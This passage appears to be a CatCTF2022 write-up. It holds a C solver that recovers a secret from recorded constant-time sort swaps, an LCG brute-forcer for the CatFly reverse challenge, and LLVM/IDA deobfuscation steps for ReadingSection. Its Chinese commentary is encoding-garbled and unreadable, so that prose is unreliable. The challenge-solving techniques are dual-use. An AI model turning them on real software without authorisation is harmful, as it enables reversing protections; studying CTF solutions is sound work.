class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">&#125;;//<span class="keyword">from</span> <span class="built_in">print</span>(n) <span class="keyword">in</span> wp.py  </span><br><span class="line">/* assume <span class="number">2</span> &lt;= n &lt;= <span class="number">0x40000000</span> */</span><br><span class="line"><span class="built_in">int</span> count=<span class="number">0</span>;</span><br><span class="line">void great_swap(<span class="built_in">int</span>* pa,<span class="built_in">int</span>* pb)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">int</span> ab=*pa^*pb;</span><br><span class="line">    <span class="built_in">int</span> c=n[count];</span><br><span class="line">    c&amp;=ab;</span><br><span class="line">    *pa^=c;</span><br><span class="line">    *pb^=c;</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void crypto_sort_int32(int32 *array,size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  size_t top,p,q,r,i,j;</span><br><span class="line">  int32 *x = array;</span><br><span class="line"></span><br><span class="line">  top = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> (top &lt; n - top) top += top;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (p = top;p &gt;= <span class="number">1</span>;p &gt;&gt;= <span class="number">1</span>) &#123;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i + <span class="number">2</span> * p &lt;= n) &#123;</span><br><span class="line">      <span class="keyword">for</span> (j = i;j &lt; i + p;++j) &#123;</span><br><span class="line">        great_swap(&amp;x[j],&amp;x[j+p]);</span><br><span class="line">      &#125;</span><br><span class="line">      i += <span class="number">2</span> * p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (j = i;j &lt; n - p;++j) &#123;</span><br><span class="line">      great_swap(&amp;x[j],&amp;x[j+p]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (q = top;q &gt; p;q &gt;&gt;= <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (j != i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">          <span class="keyword">if</span> (j == n - q) goto done;</span><br><span class="line">          int32 a = x[j + p];</span><br><span class="line">          <span class="keyword">for</span> (r = q;r &gt; p;r &gt;&gt;= <span class="number">1</span>) &#123;</span><br><span class="line">            great_swap(&amp;a,&amp;x[j + r]);</span><br><span class="line">          &#125;</span><br><span class="line">          x[j + p] = a;</span><br><span class="line">          ++j;</span><br><span class="line">          <span class="keyword">if</span> (j == i + p) &#123;</span><br><span class="line">            i += <span class="number">2</span> * p;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> (i + p &lt;= n - q) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = i;j &lt; i + p;++j) &#123;</span><br><span class="line">          int32 a = x[j + p];</span><br><span class="line">          <span class="keyword">for</span> (r = q;r &gt; p;r &gt;&gt;= <span class="number">1</span>) &#123;</span><br><span class="line">            great_swap(&amp;a,&amp;x[j+r]);</span><br><span class="line">          &#125;</span><br><span class="line">          x[j + p] = a;</span><br><span class="line">        &#125;</span><br><span class="line">        i += <span class="number">2</span> * p;</span><br><span class="line">      &#125;</span><br><span class="line">      /* now i + p &gt; n - q */</span><br><span class="line">      j = i;</span><br><span class="line">      <span class="keyword">while</span> (j &lt; n - q) &#123;</span><br><span class="line">        int32 a = x[j + p];</span><br><span class="line">        <span class="keyword">for</span> (r = q;r &gt; p;r &gt;&gt;= <span class="number">1</span>) &#123;</span><br><span class="line">          great_swap(&amp;a,&amp;x[j+r]);</span><br><span class="line">        &#125;</span><br><span class="line">        x[j + p] = a;</span><br><span class="line">        ++j;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      done: ;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> sample(<span class="built_in">int</span>* a, <span class="built_in">int</span> d,<span class="built_in">int</span> N,char * ans)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">int</span> tmp[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;d+<span class="number">1</span>;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        tmp[i]=(a[i]&lt;&lt;<span class="number">3</span>)|<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=d+<span class="number">1</span>;i&lt;<span class="number">2</span>*d+<span class="number">1</span>;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        tmp[i]=(a[i]&lt;&lt;<span class="number">3</span>)|<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">2</span>*d+<span class="number">1</span>;i&lt;N;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        tmp[i]=(a[i]&lt;&lt;<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    crypto_sort_int32(tmp,N);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        ans[i]=tmp[i]&amp;<span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">char ans[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">int</span> init[<span class="number">256</span>]=</span><br><span class="line">&#123;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">int</span> main(<span class="built_in">int</span> argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">int</span> N=<span class="number">251</span>,q=<span class="number">256</span>,p=<span class="number">3</span>,d=<span class="number">72</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="built_in">int</span> i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        init[i]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sample(init,d,N,ans);</span><br><span class="line">    printf(<span class="string">&quot;\ncount:%d\n&quot;</span>,count);</span><br><span class="line">    <span class="keyword">for</span>(<span class="built_in">int</span> i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(<span class="string">&quot;%d,&quot;</span>,ans[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åæŒ‰ç¤ºä¾‹md5ã€‚</p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="CatFlyğŸ›«ğŸ±"><a href="#CatFlyğŸ›«ğŸ±" class="headerlink" title="CatFlyğŸ›«ğŸ±"></a>CatFlyğŸ›«ğŸ±</h3><p>è®¡åˆ’ä¸­æ˜¯ä¸ªéš¾åº¦ä¸­ç­‰åä¸‹çš„é€åˆ†REé¢˜ï¼Œä½†æ˜¯è§£å¤ªå°‘äº†</p>
<p>æ‰¾åˆ°è¾“å‡ºæ–‡å­—çš„åœ°æ–¹</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/2023-01-02-22-44-31_6Tbihup_fm.png" class="">

<img src="/2023/01/01/Nepnep-CatCTF2022/2023-01-02-22-47-28_vaWGlJOtng.png" class="">

<p>æ•°æ®xoräºsub_62B5</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/2023-01-02-22-48-39_Xjj97320oU.png" class="">

<p>dword_E1E8 é™¤äº†å‡½æ•°æœ¬èº«ä¼šä¿®æ”¹ï¼Œè¿˜æœ‰ä¸€å¤„åœ°æ–¹ä¼šä¿®æ”¹</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/2023-01-02-23-05-08_8MUfX9gl9p.png" class="">

<p>æ ¹æ®printfè¾“å‡ºçš„å­—ç¬¦æ•°ä¿®æ”¹,æµ‹è¯•å¯å¾— 42 + log(count)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;string.h&gt;</span></span><br><span class="line"><span class="built_in">int</span> dword_E1E8 = <span class="number">0x1106</span>;</span><br><span class="line"><span class="built_in">int</span> dword_E120[<span class="number">50</span>]=&#123;<span class="number">0x27fb</span>, <span class="number">0x27a4</span>, <span class="number">0x464e</span>, <span class="number">0x0e36</span>, <span class="number">0x7b70</span>, <span class="number">0x5e7a</span>, <span class="number">0x1a4a</span>, <span class="number">0x45c1</span>, <span class="number">0x2bdf</span>, <span class="number">0x23bd</span>, <span class="number">0x3a15</span>, <span class="number">0x5b83</span>, <span class="number">0x1e15</span>, <span class="number">0x5367</span>, <span class="number">0x50b8</span>, <span class="number">0x20ca</span>, <span class="number">0x41f5</span>, <span class="number">0x57d1</span>, <span class="number">0x7750</span>, <span class="number">0x2adf</span>, <span class="number">0x11f8</span>, <span class="number">0x09bb</span>, <span class="number">0x5724</span>, <span class="number">0x7374</span>, <span class="number">0x3ce6</span>, <span class="number">0x646e</span>, <span class="number">0x010c</span>, <span class="number">0x6e10</span>, <span class="number">0x64f4</span>, <span class="number">0x3263</span>, <span class="number">0x3137</span>, <span class="number">0x00b8</span>, <span class="number">0x229c</span>, <span class="number">0x7bcd</span>, <span class="number">0x73bd</span>, <span class="number">0x480c</span>, <span class="number">0x14db</span>, <span class="number">0x68b9</span>, <span class="number">0x5c8a</span>, <span class="number">0x1b61</span>, <span class="number">0x6c59</span>, <span class="number">0x5707</span>, <span class="number">0x09e6</span>, <span class="number">0x1fb9</span>, <span class="number">0x2ad3</span>, <span class="number">0x76d4</span>, <span class="number">0x3113</span>, <span class="number">0x7c7e</span>, <span class="number">0x11e0</span>, <span class="number">0x6c70</span>&#125;;</span><br><span class="line"><span class="built_in">int</span> sub_62B5()</span><br><span class="line">&#123;</span><br><span class="line">  dword_E1E8 = <span class="number">1103515245</span> * dword_E1E8 + <span class="number">12345</span>;</span><br><span class="line">  <span class="keyword">return</span> (dword_E1E8 &gt;&gt; <span class="number">10</span>) &amp; <span class="number">0x7FFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> llog(<span class="built_in">int</span> n)&#123;</span><br><span class="line">    <span class="built_in">int</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(n /= <span class="number">10</span>)a++;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> sub_62E3(char a1)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> result; // rax</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (a1 &amp; 0x7Fu) &lt;= <span class="number">0x7E</span> )</span><br><span class="line">    result = (a1 &amp; 0x7Fu) &gt; <span class="number">0x20</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = 0LL;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main()&#123;</span><br><span class="line">    <span class="built_in">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">50</span>; i++)&#123;</span><br><span class="line">            dword_E120[i]^=sub_62B5();</span><br><span class="line">        &#125;</span><br><span class="line">        count++;</span><br><span class="line">        dword_E1E8+=<span class="number">42</span>+llog(count);</span><br><span class="line">        <span class="keyword">if</span>(count % <span class="number">1000000</span> == <span class="number">0</span> )&#123;</span><br><span class="line">            printf(<span class="string">&quot;Count:%d\n&quot;</span>,count);</span><br><span class="line">        &#125;</span><br><span class="line">        unsigned char flag[<span class="number">51</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">50</span>; i++)&#123;</span><br><span class="line">            // Loop: <span class="number">100427942</span></span><br><span class="line">            // <span class="keyword">if</span>((dword_E120[i] &amp; <span class="number">0xff00</span>))&#123;</span><br><span class="line">            //     <span class="keyword">break</span>;</span><br><span class="line">            // &#125;</span><br><span class="line">            // Loop: <span class="number">100001958</span></span><br><span class="line">            <span class="keyword">if</span>(!sub_62E3(dword_E120[i]))&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            flag[i]=dword_E120[i]&amp;<span class="number">0xff</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(memcmp(<span class="string">&quot;CatCTF&quot;</span>,flag,<span class="number">6</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">            puts(flag);</span><br><span class="line">            printf(<span class="string">&quot;Count:%d\n&quot;</span>,count);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/2023/01/01/Nepnep-CatCTF2022/2023-01-02-23-40-31_UlFTSbFYUW.png" class="">

<p>PS: å‡ºé¢˜æ—¶å¾ªç¯æ¬¡æ•°ä¸º705980581ï¼Œä½†æ˜¯çº¿æ€§åŒä½™éšæœºæ•°ç®—æ³•å‡ºç°äº†å¾ªç¯å¯¼è‡´åœ¨100427942å°±å‡ºç°äº†flagï¼Œè‹¥åªè€ƒè™‘æ•°ç»„çš„æœ€ä½å­—èŠ‚ï¼Œèƒ½åœ¨100001958å¾—åˆ°flag</p>
<p>é™„ï¼šnyancatå¼€æº <a target="_blank" rel="noopener" href="https://github.com/klange/nyancat" title="https://github.com/klange/nyancat">https://github.com/klange/nyancat</a></p>
<h3 id="ReadingSection"><a href="#ReadingSection" class="headerlink" title="ReadingSection"></a>ReadingSection</h3><p>å…¶å®æœ€æ—©çš„é¢„æœŸè§£æ˜¯ç¡¬è¯»LLVM IR .txtï¼Œå› ä¸ºæ•…æ„ç®—æ³•è®¾è®¡çš„å¾ˆç®€å•ï¼Œä¹Ÿä¸æ˜¯å¾ˆé•¿ï¼Œç†Ÿæ‚‰LLVM IRçš„é€‰æ‰‹å¤§æ¦‚ä¸€ä¸ªå¤šå°æ—¶å¯ä»¥åšå‡ºæ¥ã€‚åé¢å‘ç°æ­¤é¢˜å¯ä»¥æœ‰æ›´ç®€ä¾¿çš„æ–¹æ³•ã€‚</p>
<p>ä½¿ç”¨llvm-aså¯ä»¥ååºåˆ—åŒ–IRåˆ°.bcæ–‡ä»¶</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS D:\2022CTF\Myself\ReadingSection&gt; llvm-<span class="keyword">as</span> .\<span class="number">1.</span>txt -o <span class="number">1.</span>bc</span><br><span class="line">D:\LLVM\Windows\<span class="built_in">bin</span>\llvm-<span class="keyword">as</span>.exe: .\<span class="number">1.</span>txt:<span class="number">9</span>:<span class="number">62</span>: error: constant expression <span class="built_in">type</span> mismatch: got <span class="built_in">type</span> <span class="string">&#x27;[18 x i8]&#x27;</span> but expected <span class="string">&#x27;[33 x i8]&#x27;</span></span><br><span class="line"><span class="meta">@__const.main.flag = private unnamed_addr constant [<span class="number">33</span> x i8] c<span class="string">&quot;CAT Hide Your Flag&quot;</span>, align <span class="number">16</span></span></span><br></pre></td></tr></table></figure>

<p>ä¼šæœ‰ä¸€ä¸ªæŠ¥é”™ï¼Œè¿™ä¸ªæ•°ç»„æœ¬æ¥æ˜¯å­˜çš„flagï¼Œè¢«æˆ‘æ”¹æ‰äº†å¯¼è‡´é•¿åº¦å®šä¹‰ä¸å£°æ˜ä¸åŒ¹é…ã€‚éšä¾¿å°†å…¶æ•°ç»„å†…å®¹æ”¹ä¸º33é•¿åº¦å³å¯ã€‚ç„¶ållvm-aså¯ä»¥æˆåŠŸç¼–è¯‘ä¸ºbcæ–‡ä»¶ã€‚è€Œåç”¨ <em>clang -c</em>å°†bcç¼–è¯‘ä¸º.oå¯¹è±¡</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS D:\2022CTF\Myself\ReadingSection&gt; llvm-<span class="keyword">as</span> .\<span class="number">1.</span>txt -o <span class="number">1.</span>bc</span><br><span class="line">PS D:\2022CTF\Myself\ReadingSection&gt; clang -c <span class="number">1.</span>bc</span><br></pre></td></tr></table></figure>

<p>ç¼–è¯‘æˆ.oå¯¹è±¡åï¼Œå°±å¯ä»¥ç”¨IDAæ‰“å¼€äº†ï¼Œæ‰“å¼€åä¼šå‘ç°checkå‡½æ•°æ˜¯è¢«åŠ äº†éæ ‡å‡†å¹³å¦åŒ–çš„ã€‚</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/1_fXbaW2IWQm.jpg" class="">

<p>ç„¶åè¿™å°±åˆè¦ç”¨åˆ°å»æ··æ·†ç¥å™¨D810äº†ã€‚æŠŠD810æ’ä»¶æ‰“å¼€ï¼Œé€‰ç”¨é»˜è®¤è§„åˆ™ï¼Œå†F5ï¼Œæ··æ·†åŸºæœ¬è¢«å»å¹²å‡€äº†</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/2_5-u8qJkX7a.jpg" class="">

<p>å¯ä»¥çœ‹åˆ°å°±æ˜¯ä¸€ä¸ªå¼‚æˆ–+TEA</p>
